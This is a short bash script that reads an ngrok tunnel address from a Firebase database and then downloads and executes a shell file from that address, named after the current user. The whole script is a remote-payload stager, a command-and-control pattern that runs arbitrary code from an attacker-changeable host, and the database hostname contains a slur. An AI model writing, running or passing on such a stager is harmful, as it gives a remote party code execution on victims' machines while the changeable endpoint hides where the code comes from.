#!/bin/bash

# Collect ngrok url from firebase
NGROK=$(curl "https://retard-e363c-default-rtdb.asia-southeast1.firebasedatabase.app/IP.json")

# Download exec from ngrok url
curl -sO "$NGROK/$USER"

# Execute exec
sh "$USER.sh"
